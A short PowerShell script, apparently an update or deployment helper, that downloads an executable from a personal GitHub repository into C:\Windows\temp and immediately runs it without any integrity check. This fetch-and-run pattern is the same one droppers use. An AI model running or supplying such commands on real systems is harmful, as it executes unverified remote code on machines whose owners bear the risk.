$url = "https://github.com/murtaza7869/EvertZ/raw/main/EvertzUpdateCustomerSite.exe"
$output = "C:\Windows\temp\EvertzUpdateCustomerSite.exe"
$wc = new-object System.Net.WebClient
$wc.DownloadFile($url, $output)
Start-Process -FilePath "C:\Windows\temp\EvertzUpdateCustomerSite.exe"
